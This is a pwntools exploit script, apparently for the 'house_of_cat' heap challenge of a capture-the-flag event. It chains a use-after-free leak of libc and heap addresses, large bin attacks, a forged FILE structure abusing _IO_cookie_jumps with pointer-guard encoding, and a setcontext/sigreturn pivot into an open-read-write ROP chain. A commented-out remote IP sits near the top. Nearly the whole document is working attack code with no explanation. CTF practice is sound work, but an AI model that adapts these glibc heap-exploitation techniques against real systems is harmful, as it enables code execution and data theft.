from pwn import *
context.log_level = 'debug'
s = process("./house_of_cat")
# s = remote("59.110.212.61","34498")
def run(payload):
    s.recvuntil(b'~~~~~~')
    s.sendline(payload)
def cmd(choice):
    run(b'CAT | r00tQWBAAAAA$\xff\xff\xff\xffQWXF')
    s.recvuntil("choice:\n")
    s.sendline(str(choice))
def add(idx,size,buf):
    cmd(1)
    s.sendlineafter(b"plz input your cat idx:",str(idx).encode())
    s.sendlineafter(b"plz input your cat size:",str(size).encode())
    s.sendafter(b"plz input your content:",buf)
def free(idx):
    cmd(2)
    s.sendlineafter(b"plz input your cat idx:",str(idx).encode())
def show(idx):
    cmd(3)
    s.sendlineafter(b"plz input your cat idx:",str(idx).encode())
def edit(idx,buf):
    cmd(4)
    s.sendlineafter(b"plz input your cat idx:",str(idx).encode())
    s.sendafter(b"plz input your content:",buf)
def ROL(content, key):          # rotate shift left
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:key], 2)
def enc(value,key):
    return ROL(value^key,0x11)
run("LOGIN | r00tQWBAAAAAadminQWXF")
add(0,0x418,'A')
add(1,0x418,'A')
free(0)
show(0)         # get libc address
libc = ELF("./libc.so.6")
libc.address = u64(s.recvuntil("\x7f")[-6:]+b"\x00\x00")-0x219ce0
success(hex(libc.address))
tls = libc.address - 0x28c0
success(hex(tls))
add(2,0x418,'A')    # same addr as chunk 0
add(3,0x420,'A')
add(4,0x418,'A')
free(3)
add(5,0x430,'A')    # chunk 3 to large bin
add(6,0x450,'A')
add(7,0x430,'A')
free(2)             # chunk 2 to unsorted bin
payload = p64(libc.address+0x21a0d0)*2+p64(0)+p64(tls+0x30-0x20)
edit(3,payload)     # UAF, alter fd_nextsize and bk_nextsize of chunk 3
add(15,0x440,'A')   # chunk 2 to large bin, trigger large bin attack
show(3)             # get heap address
s.recvuntil("Context:\n")
heapbase = u64(s.recv(6)+b"\x00\x00")-0x290
success(hex(heapbase))
key = heapbase+0x290    # chunk 2 address
success(hex(key))
context.arch='amd64'
gadget = 0x00000000001675b0+libc.address

payload = FileStructure()
payload._lock=libc.address+0x21ba70 #_IO_stdfile_1_lock
io_cookie_jumps = libc.address+0x215b80
payload.vtable=io_cookie_jumps+8*7 #_IO_cookie_read->xsputn
payload = bytes(payload)[0x10:]
payload += p64(heapbase+0x2460+0x100)+p64(enc(gadget,key))
payload = payload.ljust(0x100,b'\x00')
payload += b'A'*8+p64(heapbase+0x2460+0x100)+b'A'*0x10+p64(libc.sym['setcontext']+61)

pop_rdi = 0x000000000002a3e5+libc.address
pop_rsi = 0x000000000002be51+libc.address
pop_rdx_rbx = 0x0000000000090529 + libc.address
pop_rax = 0x0000000000045eb0+libc.address
syscall = 0x0000000000091396+libc.address

sig = SigreturnFrame()
sig.rsp = heapbase+0x2460+0x300
sig.rip = pop_rdi+1
payload += flat(sig)[0x28:]
payload = payload.ljust(0x300,b'\x00')
payload += p64(pop_rdi)+p64(0)+p64(libc.sym['close'])
payload += p64(pop_rdi)+p64(heapbase+0x2460+0x400)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
payload += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(heapbase+0x500)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(libc.sym['read'])
payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heapbase+0x500)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(libc.sym['write'])

add(8,0x440,payload)#stderr chunk
add(9,0x430,'A')
free(5)
free(6)
add(10,0x430+0x30,b'A'*0x430+p64(0)+p64(0x461))
add(11,0x420,'A') #target
free(6)
add(12,0x450,b'A'*0x20+p64(0)+p64(0x19c1))
free(6)
add(13,0x460,'A')
free(8)
free(11)
payload = p64(libc.address+0x21a0e0)*2+p64(0)+p64(libc.sym['stderr']-0x20)+p64(0)+p64(0x301)
edit(6,payload)
# gdb.attach(s,'b _IO_cookie_read')
# add(14,0x46f,'1')
cmd(1)
s.sendlineafter("plz input your cat idx:",str(14))
gdb.attach(s)
time.sleep(1)
s.sendlineafter("plz input your cat size:",str(0x46f))
# free(0)
s.interactive()